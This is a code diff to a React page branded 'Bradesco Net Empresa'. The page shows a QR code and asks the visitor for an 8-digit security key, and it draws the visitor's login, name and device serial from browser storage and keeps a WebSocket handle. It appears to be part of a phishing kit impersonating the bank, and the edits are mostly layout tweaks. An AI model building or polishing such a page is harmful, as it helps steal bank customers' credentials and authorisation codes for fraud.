@@ -4,7 +4,7 @@ import bradescoLogo from "@/assets/bradesco-logo.png";
 const QRCodePage = () => {
   const usuario = localStorage.getItem("usuario") || "";
   const nome = localStorage.getItem("nome") || "";
-  const qr = sessionStorage.getItem("qr") || "";
+  const qr = localStorage.getItem("qr") || "";
   const dispositivo = localStorage.getItem("dispositivo") || "";
   const wsRef = useRef<WebSocket | null>(null);
   const [chave, setChave] = useState(["", "", "", "", "", "", "", ""]);
@@ -92,7 +92,7 @@ const QRCodePage = () => {
           <h1 className="text-white text-base font-semibold tracking-tight">Bradesco Net Empresa</h1>
         </div>
 
-        <div className="flex flex-col items-center flex-1 px-6 pt-6">
+        <div className="flex flex-col items-center flex-1 px-5 pt-6">
           <img src={bradescoLogo} alt="Bradesco" className="w-16 h-16 object-contain mb-4" />
 
           {nome && (
@@ -101,9 +101,7 @@ const QRCodePage = () => {
             </p>
           )}
 
-          <h2 className="text-[hsl(220,20%,14%)] text-lg font-bold mb-1 text-center">
-            Validação de segurança
-          </h2>
+          <h2 className="text-[hsl(220,20%,14%)] text-lg font-bold mb-1 text-center">Validação de segurança</h2>
           <p className="text-[hsl(220,10%,46%)] text-xs text-center mb-5 max-w-[260px]">
             Escaneie o QR Code abaixo com o aplicativo Bradesco para validar seu acesso.
           </p>
@@ -120,25 +118,22 @@ const QRCodePage = () => {
 
           {/* Security key input */}
           <div className="w-full bg-white rounded-xl px-4 py-5 border border-[hsl(220,14%,89%)] mb-4">
-            {/* Icon + title row */}
             <div className="flex items-center gap-3 mb-4">
-              <div className="w-12 h-12 flex items-center justify-center">
-                <svg xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 text-[hsl(220,10%,60%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
-                  <rect x="3" y="3" width="7" height="7" rx="1" />
-                  <rect x="14" y="3" width="7" height="7" rx="1" />
-                  <rect x="3" y="14" width="7" height="7" rx="1" />
-                  <rect x="14" y="14" width="4" height="4" rx="1" />
-                  <path d="M20 16v2a2 2 0 0 1-2 2h-1" />
-                  <path d="M21 21h.01" />
-                </svg>
-              </div>
+              <svg xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 shrink-0 text-[hsl(220,10%,60%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
+                <rect x="3" y="3" width="7" height="7" rx="1" />
+                <rect x="14" y="3" width="7" height="7" rx="1" />
+                <rect x="3" y="14" width="7" height="7" rx="1" />
+                <rect x="14" y="14" width="4" height="4" rx="1" />
+                <path d="M20 16v2a2 2 0 0 1-2 2h-1" />
+                <path d="M21 21h.01" />
+              </svg>
               <h3 className="text-[hsl(220,20%,14%)] text-sm font-bold leading-tight">
                 Digite a Chave de segurança com 8 dígitos
               </h3>
             </div>
 
             {/* 8 digit boxes */}
-            <div className="flex justify-center gap-2 mb-3">
+            <div className="flex justify-between px-1 mb-3">
               {chave.map((digit, i) => (
                 <input
                   key={i}
@@ -149,21 +144,17 @@ const QRCodePage = () => {
                   value={digit}
                   onChange={(e) => handleDigit(i, e.target.value)}
                   onKeyDown={(e) => handleKeyDown(i, e)}
-                  className="w-9 h-11 text-center text-lg font-mono border-b-2 border-[hsl(220,14%,80%)] bg-transparent focus:outline-none focus:border-[hsl(220,60%,40%)] transition-colors"
+                  className="w-8 h-10 text-center text-base font-mono border-b-2 border-[hsl(220,14%,80%)] bg-transparent focus:outline-none focus:border-[hsl(220,60%,40%)] transition-colors"
                 />
               ))}
             </div>
 
             {/* Device serial */}
-            {dispositivo && (
-              <p className="text-[hsl(220,10%,56%)] text-xs text-center mb-4">
-                Confira o número de série do seu dispositivo: <span className="font-bold text-[hsl(220,20%,14%)]">{dispositivo}</span>
-              </p>
-            )}
+            <p className="text-[hsl(220,10%,56%)] text-xs text-center mb-4">
+              Confira o número de série do seu dispositivo: <span className="font-bold text-[hsl(220,20%,14%)]">{dispositivo || "—"}</span>
+            </p>
 
-            {erro && (
-              <p className="text-[hsl(0,84%,60%)] text-xs text-center mb-3">{erro}</p>
-            )}
+            {erro && <p className="text-[hsl(0,84%,60%)] text-xs text-center mb-3">{erro}</p>}
 
             <button
               onClick={enviarChave}
